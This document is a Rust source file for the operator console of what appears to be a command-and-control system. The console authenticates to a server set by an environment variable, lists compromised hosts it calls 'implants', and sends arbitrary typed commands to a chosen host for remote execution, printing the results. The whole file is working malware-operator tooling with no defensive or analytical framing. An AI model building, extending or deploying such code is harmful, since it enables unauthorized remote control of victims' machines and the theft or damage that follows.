use std::{
    env,
    io::{Write, stdin, stdout},
    net::TcpStream,
};

use common::{Implant, Packet, encode, read_packet};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let passwd = rpassword::prompt_password("Input password: ")?;

    let mut connection = connect();
    connection.write(
        encode(Packet::DashboardLogin { password: passwd })
            .unwrap()
            .as_slice(),
    )?;

    let packet = read_packet(&mut connection).unwrap();

    match packet {
        Packet::LoginSuccess => {
            println!("Login successful!");
        }
        Packet::LoginFailed => {
            println!("Login failed.");
            return Ok(());
        }
        _ => {
            println!("Unexpected packet received");
            return Ok(());
        }
    }

    loop {
        let mut connection = connect();

        connection.write(
            encode(common::Packet::ImplantListRequest)
                .unwrap()
                .as_slice(),
        )?;

        let packet = match read_packet(&mut connection) {
            Ok(packet) => packet,
            Err(_) => continue,
        };

        let mut implants = Vec::new();

        match packet {
            Packet::ImplantList(implant_list) => {
                implants = implant_list;
            }
            Packet::CommandResults { results } => {
                for (result, _code) in results {
                    println!("{result}");
                }
            }
            _ => {}
        }

        if implants.is_empty() {
            println!("No implants found");
        } else {
            println!("Available implants: ");
            for (i, implant) in implants.iter().enumerate() {
                println!(
                    "[{}]: {} ({})",
                    i + 1,
                    implant.system_info.hostname,
                    implant.system_info.name
                );
            }
        }

        println!("");
        print!("> ");
        stdout().flush().unwrap();
        let mut input = String::new();
        stdin().read_line(&mut input).unwrap();
        let input = input.trim();

        if input == "exit" {
            break;
        }

        if let Ok(index) = input.parse::<usize>()
            && let Some(implant) = implants.get(index - 1)
        {
            drop(connection);
            enter_command_loop(index - 1, implant);
        }
    }

    Ok(())
}

fn connect() -> TcpStream {
    let address = env::var_os("TYSE_ADDRESS").unwrap();
    TcpStream::connect(address.into_string().unwrap()).unwrap()
}

fn enter_command_loop(implant_id: usize, implant: &Implant) {
    loop {
        print!("{}> ", implant.system_info.hostname);
        stdout().flush().unwrap();

        let mut input = String::new();
        stdin().read_line(&mut input).unwrap();
        let input = input.trim();

        if input == "exit" {
            return;
        }

        let mut connection = connect();
        if !input.is_empty() {
            connection
                .write(
                    encode(Packet::Command {
                        implant_id,
                        command: input.to_string(),
                    })
                    .unwrap()
                    .as_slice(),
                )
                .unwrap();
        }

        let packet = read_packet(&mut connection).unwrap();

        match packet {
            Packet::CommandResults { results } => {
                for (output, _) in results {
                    println!("{output}");
                }
            }
            _ => {}
        }
    }
}
